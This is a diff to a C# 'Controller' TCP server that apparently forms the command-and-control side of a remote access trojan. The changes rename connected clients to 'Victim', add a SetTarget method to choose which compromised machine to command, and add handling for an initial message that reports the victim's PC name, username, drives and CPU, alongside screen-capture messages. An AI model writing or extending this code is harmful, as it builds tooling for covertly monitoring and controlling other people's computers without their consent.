@@ -3,26 +3,28 @@ using System.Net;
 using System.Text;
 using System.Text.Json;
 using Controller.Models;
-using Controller.Helpers;
 using System.Diagnostics;
 
 namespace Controller.Services
 {
-    public delegate Task MessageHandlerDelegate(IClient client, string messageType, object payload);
+    public delegate Task MessageHandlerDelegate(IVictim client, string messageType, object payload);
 
     public static class TCPService
     {
-        private static TCPClient? activeClient;
+        private static Victim? activeClient;
         private static TcpListener? listener;
-        private static ClientManager? clientManager;
+        private static VictimManager? clientManager;
         private static MessageHandlerDelegate? messageHandler;
         private static CancellationTokenSource? cts;
         private static JsonSerializerOptions? jsonOptions;
 
+        public static Action<Victim>? OnVictimConnected { get; set; }
+        public static Action<Victim>? OnVictimDisconnected { get; set; }
+
         public static void Start(int port, MessageHandlerDelegate handler)
         {
             listener = new TcpListener(IPAddress.Parse("0.0.0.0"), port);
-            clientManager = new ClientManager();
+            clientManager = new VictimManager();
             messageHandler = handler;
             cts = new CancellationTokenSource();
             jsonOptions = new JsonSerializerOptions
@@ -31,6 +33,11 @@ namespace Controller.Services
             };
 
             _ = StartAsync(); // Server runs asynchronously
+        }
+
+        public static void SetTarget(Victim victim)
+        {
+            activeClient = victim;
         }
 
         public static Task SendAsync<T>(string messageType, T payload)
@@ -62,10 +69,9 @@ namespace Controller.Services
                 while (!cts!.Token.IsCancellationRequested)
                 {
                     var tcpClient = await listener.AcceptTcpClientAsync(cts.Token);
-                    var client = new TCPClient(tcpClient);
+                    var client = new Victim(tcpClient);
                     clientManager?.AddClient(client);
                     _ = HandleClientAsync(client);
-                    activeClient ??= client;
                 }
             }
             catch (OperationCanceledException)
@@ -79,7 +85,7 @@ namespace Controller.Services
             }
         }
 
-        private static async Task HandleClientAsync(TCPClient client)
+        private static async Task HandleClientAsync(Victim client)
         {
             try
             {
@@ -97,7 +103,10 @@ namespace Controller.Services
             }
             finally
             {
+                OnVictimDisconnected?.Invoke(client);
                 clientManager?.RemoveClient(client.Id);
+                if (activeClient == client) activeClient = null;
+
                 client.DisconnectAsync();
             }
         }
@@ -122,7 +131,7 @@ namespace Controller.Services
             return JsonDocument.Parse(json);
         }
 
-        private static async Task ProcessMessageAsync(IClient client, JsonDocument message)
+        private static async Task ProcessMessageAsync(IVictim client, JsonDocument message)
         {
             string messageType = message.RootElement.GetProperty("Type").GetString() ?? "n/k";
             JsonElement payloadElement = message.RootElement.GetProperty("Payload");
@@ -130,6 +139,16 @@ namespace Controller.Services
 
             switch (messageType.ToLower())
             {
+                case MSGType.InitMSG:
+                    var imsg = JsonSerializer.Deserialize<InitMSG>(payloadElement.GetRawText(), jsonOptions);
+                    var victim = ((Victim)client);
+
+                    Debug.WriteLine($"PCName: {imsg?.PCName}, Username: {imsg?.Username}, DriveCount: {imsg?.DriveCount}, CPUCores: {imsg?.CPUCores}, Is64Bit: {imsg?.Is64Bit}");
+
+                    victim.Init(imsg);
+                    OnVictimConnected?.Invoke(victim);
+                    return;
+
                 case MSGType.ScreenMSG:
                     payload = JsonSerializer.Deserialize<ScreenMSG>(payloadElement.GetRawText(), jsonOptions);
                     break;
